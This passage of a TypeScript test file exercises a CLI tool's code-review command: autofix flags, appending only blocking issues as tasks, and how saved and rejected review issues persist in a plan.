            {
              title: 'Test task',
              description: 'A clean test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Test both with and without autofix flag - should behave the same (no autofix)
    await handleReviewCommand(126, {}, mockCommand);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    // Reset mock and test with autofix flag
    mockExecutor.execute.mockClear();
    await handleReviewCommand(126, { autofix: true }, mockCommand);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('no-autofix flag prevents autofix even when issues found', async () => {
    await writePlanToDb(
      {
        id: 127,
        title: 'Test No-Autofix Flag',
        goal: 'Test no-autofix flag prevention',
        tasks: [{ title: 'Test task', description: 'A test task with issues' }],
      },
      { cwdForIdentity: testDir }
    );
    const planFile = join(testDir, 'no-autofix-test.yml'); // only used in mock context

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Security - SQL injection vulnerability',
                file: 'src/db.ts',
                line: '55',
                suggestion: 'Use parameterized queries',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }
        throw new Error('Autofix should not be executed with --no-autofix flag');
      }),
    };

    // Mock confirm to throw if called (it shouldn't be with --no-autofix)
    // Also mock checkbox to throw if called (it shouldn't be with --no-autofix)
    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --no-autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockRejectedValue(
      new Error('Checkbox should not be called with --no-autofix flag')
    );

    // Short-circuit context gathering to avoid touching real git and IO
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '127',
        planData: {
          id: 127,
          title: 'Test No-Autofix Flag',
          goal: 'Test no-autofix flag prevention',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task with issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(127, { noAutofix: true }, mockCommand);

    // Should only execute review, not autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('CLI no-autofix shape skips prompts and saves all issues when requested', async () => {
    await writePlanToDb(
      {
        id: 128,
        title: 'Test CLI No-Autofix Flag',
        goal: 'Test Commander no-autofix option shape',
        tasks: [{ title: 'Test task', description: 'A test task with issues' }],
      },
      { cwdForIdentity: testDir }
    );

    const mockExecutor = {
      execute: vi.fn(async () =>
        JSON.stringify({
          issues: [
            {
              severity: 'critical',
              category: 'security',
              content: 'Security - SQL injection vulnerability',
              file: 'src/db.ts',
              line: '55',
              suggestion: 'Use parameterized queries',
            },
            {
              severity: 'minor',
              category: 'testing',
              content: 'Missing regression test',
              file: 'src/db.test.ts',
              line: '12',
              suggestion: 'Add a test',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      ),
    };

    promptSelectSpy.mockRejectedValue(new Error('Prompt select should not be called'));
    promptCheckboxSpy.mockRejectedValue(new Error('Prompt checkbox should not be called'));

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '128',
        planData: {
          id: 128,
          title: 'Test CLI No-Autofix Flag',
          goal: 'Test Commander no-autofix option shape',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const result = await handleReviewCommand(
      128,
      { autofix: false, saveIssues: true },
      { parent: { opts: () => ({}) } }
    );

    expect(result.issuesSaved).toBe(2);
    expect(promptSelectSpy).not.toHaveBeenCalled();
    expect(promptCheckboxSpy).not.toHaveBeenCalled();
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    const updatedPlan = (await resolvePlanByNumericId(128, testDir)).plan;
    expect(updatedPlan.reviewIssues).toHaveLength(2);
  });

  describe('blockingIssuesOnlyAppendTasks (interactive append action)', () => {
    // This suite must run with TIM_OUTPUT_SOCKET unset. When set (tunnel mode),
    // handleReviewCommand forces its non-interactive path regardless of
    // TIM_INTERACTIVE, which would bypass the interactive append action entirely.
    let originalOutputSocket: string | undefined;

    beforeEach(() => {
      originalOutputSocket = process.env.TIM_OUTPUT_SOCKET;
      delete process.env.TIM_OUTPUT_SOCKET;
    });

    afterEach(() => {
      if (originalOutputSocket === undefined) {
        delete process.env.TIM_OUTPUT_SOCKET;
      } else {
        process.env.TIM_OUTPUT_SOCKET = originalOutputSocket;
      }
    });

    test('interactive append only offers/appends blocking issues, saves the rest', async () => {
      await writePlanToDb(
        {
          id: 129,
          title: 'Test Blocking Gate Mixed Severity',
          goal: 'Test blockingIssuesOnlyAppendTasks with mixed severities',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'major',
              category: 'bug',
              content: 'Missing null check causes a crash',
              file: 'src/app.ts',
              line: '10',
              suggestion: 'Add a null check',
            },
            {
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: '20',
              suggestion: 'Rename for consistency',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '129',
          planData: {
            id: 129,
            title: 'Test Blocking Gate Mixed Severity',
            goal: 'Test blockingIssuesOnlyAppendTasks with mixed severities',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      // Only one issue (the blocking "major" one) should be offered by selectIssuesToFix;
      // select it via checkbox index 0.
      promptSelectSpy.mockResolvedValueOnce('append' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0] as any);

      const result = await handleReviewCommand(
        129,
        { blockingIssuesOnlyAppendTasks: true },
        { parent: { opts: () => ({}) } }
      );

      expect(promptCheckboxSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          choices: [expect.objectContaining({ name: expect.stringContaining('[MAJOR]') })],
        })
      );

      expect(result.tasksAppended).toBe(1);
      expect(result.issuesSaved).toBe(1);

      const updatedPlan = (await resolvePlanByNumericId(129, testDir)).plan;
      expect(updatedPlan.tasks.some((t) => t.title.includes('Missing null check'))).toBe(true);
      expect(updatedPlan.tasks.some((t) => t.title.includes('Inconsistent naming'))).toBe(false);
      expect(updatedPlan.reviewIssues).toHaveLength(1);
      expect(updatedPlan.reviewIssues?.[0]?.severity).toBe('minor');
    });

    test('interactive append with only non-blocking issues appends nothing and saves them all', async () => {
      await writePlanToDb(
        {
          id: 130,
          title: 'Test Blocking Gate Non-Blocking Only',
          goal: 'Test blockingIssuesOnlyAppendTasks with only non-blocking issues',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'Minor naming nit',
              file: 'src/app.ts',
              line: '5',
              suggestion: 'Rename',
            },
            {
              severity: 'info',
              category: 'other',
              content: 'Pre-existing observation',
              file: 'src/app.ts',
              line: '6',
              suggestion: 'No action needed',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '130',
          planData: {
            id: 130,
            title: 'Test Blocking Gate Non-Blocking Only',
            goal: 'Test blockingIssuesOnlyAppendTasks with only non-blocking issues',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('append' as any);

      const result = await handleReviewCommand(
        130,
        { blockingIssuesOnlyAppendTasks: true },
        { parent: { opts: () => ({}) } }
      );

      // No blocking issues exist, so selectIssuesToFix (and its checkbox prompt) is never reached.
      expect(promptCheckboxSpy).not.toHaveBeenCalled();
      expect(result.tasksAppended).toBe(0);
      expect(result.issuesSaved).toBe(2);

      const updatedPlan = (await resolvePlanByNumericId(130, testDir)).plan;
      expect(updatedPlan.tasks).toHaveLength(1);
      expect(updatedPlan.reviewIssues).toHaveLength(2);
    });

    test('flag unset: interactive append offers and appends all actionable issues, including minor', async () => {
      await writePlanToDb(
        {
          id: 131,
          title: 'Test Blocking Gate Flag Unset',
          goal: 'Default tim review behavior without blockingIssuesOnlyAppendTasks',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'major',
              category: 'bug',
              content: 'Missing null check causes a crash',
              file: 'src/app.ts',
              line: '10',
              suggestion: 'Add a null check',
            },
            {
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: '20',
              suggestion: 'Rename for consistency',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '131',
          planData: {
            id: 131,
            title: 'Test Blocking Gate Flag Unset',
            goal: 'Default tim review behavior without blockingIssuesOnlyAppendTasks',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('append' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0, 1] as any);

      // No blockingIssuesOnlyAppendTasks option at all — matches ordinary `tim review` callers.
      const result = await handleReviewCommand(131, {}, { parent: { opts: () => ({}) } });

      expect(promptCheckboxSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          choices: [
            expect.objectContaining({ name: expect.stringContaining('[MAJOR]') }),
            expect.objectContaining({ name: expect.stringContaining('[MINOR]') }),
          ],
        })
      );

      expect(result.tasksAppended).toBe(2);
      expect(result.issuesSaved ?? 0).toBe(0);

      const updatedPlan = (await resolvePlanByNumericId(131, testDir)).plan;
      expect(updatedPlan.tasks.some((t) => t.title.includes('Missing null check'))).toBe(true);
      expect(updatedPlan.tasks.some((t) => t.title.includes('Inconsistent naming'))).toBe(true);
      expect(updatedPlan.reviewIssues ?? []).toHaveLength(0);
    });

    test('flag set: a critical finding is treated as blocking and offered for append', async () => {
      await writePlanToDb(
        {
          id: 132,
          title: 'Test Blocking Gate Critical Severity',
          goal: 'Test blockingIssuesOnlyAppendTasks treats critical as blocking',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'critical',
              category: 'security',
              content: 'SQL injection via unsanitized input',
              file: 'src/app.ts',
              line: '30',
              suggestion: 'Use parameterized queries',
            },
            {
              severity: 'info',
              category: 'other',
              content: 'Pre-existing observation',
              file: 'src/app.ts',
              line: '6',
              suggestion: 'No action needed',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '132',
          planData: {
            id: 132,
            title: 'Test Blocking Gate Critical Severity',
            goal: 'Test blockingIssuesOnlyAppendTasks treats critical as blocking',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('append' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0] as any);

      const result = await handleReviewCommand(
        132,
        { blockingIssuesOnlyAppendTasks: true },
        { parent: { opts: () => ({}) } }
      );

      expect(promptCheckboxSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          choices: [expect.objectContaining({ name: expect.stringContaining('[CRITICAL]') })],
        })
      );

      expect(result.tasksAppended).toBe(1);
      expect(result.issuesSaved).toBe(1);

      const updatedPlan = (await resolvePlanByNumericId(132, testDir)).plan;
      expect(updatedPlan.tasks.some((t) => t.title.includes('SQL injection'))).toBe(true);
      expect(updatedPlan.reviewIssues).toHaveLength(1);
      expect(updatedPlan.reviewIssues?.[0]?.severity).toBe('info');
    });
  });

  describe('review issue disposition persistence (merge dedup, rejected survival, clear guard)', () => {
    let originalOutputSocket: string | undefined;

    beforeEach(() => {
      originalOutputSocket = process.env.TIM_OUTPUT_SOCKET;
      delete process.env.TIM_OUTPUT_SOCKET;
    });

    afterEach(() => {
      if (originalOutputSocket === undefined) {
        delete process.env.TIM_OUTPUT_SOCKET;
      } else {
        process.env.TIM_OUTPUT_SOCKET = originalOutputSocket;
      }
    });

    test('append-gate merge preserves unrelated saved issues, dedups a matching identity, and keeps the rejected ledger', async () => {
      await writePlanToDb(
        {
          id: 133,
          title: 'Test Merge Dedup',
          goal: 'Test merge mode preserves and dedups pre-existing saved issues',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          reviewIssues: [
            {
              id: 'pre-open-keep',
              severity: 'minor',
              category: 'style',
              content: 'Pre-existing unrelated open issue',
              file: 'src/other.ts',
              line: '1',
              suggestion: 'Leave as is for now',
            },
            {
              id: 'pre-open-dup',
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: '20',
              suggestion: 'An older suggestion for the same finding',
            },
            {
              id: 'pre-rejected',
              severity: 'major',
              category: 'bug',
              content: 'A previously rejected finding',
              file: 'src/rejected.ts',
              line: '5',
              rejected: true,
              rejectedReason: 'Intentional, matches an existing pattern',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'major',
              category: 'bug',
              content: 'Missing null check causes a crash',
              file: 'src/app.ts',
              line: '10',
              suggestion: 'Add a null check',
            },
            {
              // Same identity (category/content/file/line) as the pre-existing
              // 'pre-open-dup' issue, but with a refreshed suggestion.
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: '20',
              suggestion: 'Rename for consistency',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '133',
          planData: {
            id: 133,
            title: 'Test Merge Dedup',
            goal: 'Test merge mode preserves and dedups pre-existing saved issues',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('append' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0] as any);

      const result = await handleReviewCommand(
        133,
        { blockingIssuesOnlyAppendTasks: true },
        { parent: { opts: () => ({}) } }
      );

      expect(result.tasksAppended).toBe(1);
      expect(result.issuesSaved).toBe(1);

      const updatedPlan = (await resolvePlanByNumericId(133, testDir)).plan;
      expect(updatedPlan.tasks.some((t) => t.title.includes('Missing null check'))).toBe(true);

      // Rejected entry first (per applyReviewIssueSave ordering), then open issues in their
      // original order: the unrelated pre-existing issue untouched, and the matching-identity
      // issue updated in place (not duplicated) with the new review's suggestion.
      expect(updatedPlan.reviewIssues).toEqual([
        expect.objectContaining({
          id: 'pre-rejected',
          rejected: true,
          rejectedReason: 'Intentional, matches an existing pattern',
        }),
        expect.objectContaining({
          id: 'pre-open-keep',
          content: 'Pre-existing unrelated open issue',
          suggestion: 'Leave as is for now',
        }),
        expect.objectContaining({
          content: 'Inconsistent naming',
          suggestion: 'Rename for consistency',
        }),
      ]);
      expect(updatedPlan.reviewIssues).toHaveLength(3);
    });

    test('exit-manually-resolved clears saved open issues but preserves the rejected ledger, even with no new findings', async () => {
      await writePlanToDb(
        {
          id: 134,
          title: 'Test Exit Manually Resolved Clear Guard',
          goal: 'Test clearing preserves rejected entries when nothing new is saved',
          tasks: [{ title: 'Test task', description: 'A test task, already fixed by hand' }],
          reviewIssues: [
            {
              id: 'pre-open-clear-me',
              severity: 'minor',
              category: 'style',
              content: 'Stale open finding that was manually resolved',
              file: 'src/manual.ts',
              line: '1',
            },
            {
              id: 'pre-rejected-keep',
              severity: 'major',
              category: 'bug',
              content: 'A previously rejected finding',
              file: 'src/rejected.ts',
              line: '5',
              rejected: true,
              rejectedReason: 'Intentional, matches an existing pattern',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      // The review still finds a new issue, but exit-manually-resolved discards it unsaved
      // (the user is asserting the plan is already fixed by hand) rather than persisting it.
      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'A fresh finding the user says is already handled',
              file: 'src/manual.ts',
              line: '2',
              suggestion: 'No action needed',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '134',
          planData: {
            id: 134,
            title: 'Test Exit Manually Resolved Clear Guard',
            goal: 'Test clearing preserves rejected entries when nothing new is saved',
            tasks: [{ title: 'Test task', description: 'A test task, already fixed by hand' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/manual.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      // promptSelectSpy's beforeEach default already resolves to 'exit-manually-resolved'.
      const result = await handleReviewCommand(134, {}, { parent: { opts: () => ({}) } });

      expect(result.tasksAppended).toBe(0);
      expect(result.issuesSaved ?? 0).toBe(0);

      const updatedPlan = (await resolvePlanByNumericId(134, testDir)).plan;
      // The freshly found issue is discarded unsaved; the stale pre-existing open issue is
      // cleared; the rejected ledger entry survives.
      expect(updatedPlan.reviewIssues).toEqual([
        expect.objectContaining({
          id: 'pre-rejected-keep',
          rejected: true,
        }),
      ]);
      expect(updatedPlan.reviewIssues).toHaveLength(1);
    });

    test('interactive exit (save-for-later) with an empty selection does not wipe the open issue queue', async () => {
      await writePlanToDb(
        {
          id: 140,
          title: 'Test Exit Empty Selection Guard',
          goal: 'Test that choosing exit with zero issues selected is a true no-op',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          reviewIssues: [
            {
              id: 'pre-open-untouched',
              severity: 'minor',
              category: 'style',
              content: 'Pre-existing open issue that must survive an empty exit selection',
              file: 'src/other.ts',
              line: '1',
              suggestion: 'Leave as is for now',
            },
            {
              id: 'pre-rejected-untouched',
              severity: 'major',
              category: 'bug',
              content: 'A previously rejected finding',
              file: 'src/rejected.ts',
              line: '5',
              rejected: true,
              rejectedReason: 'Intentional, matches an existing pattern',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      const beforePlan = (await resolvePlanByNumericId(140, testDir)).plan;

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'A fresh finding the user declines to save',
              file: 'src/app.ts',
              line: '10',
              suggestion: 'Consider a fix later',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '140',
          planData: {
            id: 140,
            title: 'Test Exit Empty Selection Guard',
            goal: 'Test that choosing exit with zero issues selected is a true no-op',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      // Choose "Exit (save issues for later)" and select zero issues from the checkbox prompt.
      promptSelectSpy.mockResolvedValueOnce('exit' as any);
      promptCheckboxSpy.mockResolvedValueOnce([] as any);

      const result = await handleReviewCommand(140, {}, { parent: { opts: () => ({}) } });

      // Before the consolidation, an empty exit selection fell through to an empty
      // replace-mode save, which wiped the plan's entire open issue queue. The new
      // disposition-based path must skip persistence entirely instead.
      expect(result.tasksAppended).toBe(0);
      expect(result.issuesSaved ?? 0).toBe(0);
      expect(vi.mocked(loggingModule.log)).toHaveBeenCalledWith(
        expect.stringContaining('No issues selected to save for later.')
      );

      const updatedPlan = (await resolvePlanByNumericId(140, testDir)).plan;
      expect(updatedPlan.reviewIssues).toEqual(beforePlan.reviewIssues);
      // No plan write happened at all: updatedAt must not have moved.
      expect(updatedPlan.updatedAt).toEqual(beforePlan.updatedAt);
    });

    test('--issues replay combined with --save-issues does not re-write the plan', async () => {
      const originalOutputSocket = process.env.TIM_OUTPUT_SOCKET;
      process.env.TIM_OUTPUT_SOCKET = '/tmp/does-not-need-to-exist.sock';

      try {
        await writePlanToDb(
          {
            id: 141,
            title: 'Test Issues Replay Save Guard',
            goal: 'Test that --issues combined with --save-issues does not re-persist',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
            reviewIssues: [
              {
                id: 'pre-open-replay',
                severity: 'major',
                category: 'bug',
                content: 'An open issue saved from a prior review run',
                file: 'src/app.ts',
                line: '10',
                suggestion: 'Fix it',
              },
              {
                id: 'pre-rejected-replay',
                severity: 'minor',
                category: 'style',
                content: 'A previously rejected finding',
                file: 'src/rejected.ts',
                line: '5',
                rejected: true,
                rejectedReason: 'Intentional, matches an existing pattern',
                rejectedAt: '2026-08-03T12:00:00.000Z',
              },
            ],
          },
          { cwdForIdentity: testDir }
        );

        const beforePlan = (await resolvePlanByNumericId(141, testDir)).plan;

        vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
          createMockPlanContext({
            resolvedPlanFile: '141',
            planData: {
              id: 141,
              title: 'Test Issues Replay Save Guard',
              goal: 'Test that --issues combined with --save-issues does not re-persist',
              tasks: [{ title: 'Test task', description: 'A test task with issues' }],
              reviewIssues: beforePlan.reviewIssues,
            },
            parentChain: [],
            completedChildren: [],
            diffResult: {
              hasChanges: true,
              changedFiles: ['src/app.ts'],
              baseBranch: 'main',
              diffContent: 'mock diff content',
            },
            incrementalSummary: null,
            noChangesDetected: false,
          }) as any
        );

        vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
          defaultExecutor: 'claude-code',
        } as any);
        vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');

        // Non-interactive (TIM_OUTPUT_SOCKET forces this regardless of TIM_INTERACTIVE) and
        // noAutofix so handleReviewIssueActions takes none of its action branches; the
        // `options.issues` replay path is what's under test here.
        const result = await handleReviewCommand(
          141,
          { issues: true, saveIssues: true, noAutofix: true },
          { parent: { opts: () => ({}) } }
        );

        expect(result.issuesSaved ?? 0).toBe(0);

        const updatedPlan = (await resolvePlanByNumericId(141, testDir)).plan;
        expect(updatedPlan.reviewIssues).toEqual(beforePlan.reviewIssues);
        // No plan write occurred: updatedAt must not have moved.
        expect(updatedPlan.updatedAt).toEqual(beforePlan.updatedAt);
      } finally {
        if (originalOutputSocket === undefined) {
          delete process.env.TIM_OUTPUT_SOCKET;
        } else {
          process.env.TIM_OUTPUT_SOCKET = originalOutputSocket;
        }
      }
    });
  });

  test('detectIssuesInReview - detects issues via totalIssues count', () => {
    const reviewResult = {
      summary: { totalIssues: 2 },
      issues: [],
    } as any;

    const result = detectIssuesInReview(reviewResult, 'Some review output');
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - detects issues via issues array', () => {
    const reviewResult = {
      summary: { totalIssues: 0 },
      issues: [{ id: 'test-issue', title: 'Test Issue' }],
    } as any;

    const result = detectIssuesInReview(reviewResult, 'Some review output');
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - handles null/undefined inputs safely', () => {
    expect(detectIssuesInReview(null as any, '')).toBe(false);
    expect(detectIssuesInReview(undefined as any, '')).toBe(false);
    expect(detectIssuesInReview({} as any, '')).toBe(false);
    expect(detectIssuesInReview({ summary: {} } as any, '')).toBe(false);
  });

  test('buildAutofixPrompt - validates required inputs', () => {
    const validPlanData = {
      id: 42,
      title: 'Test Plan',
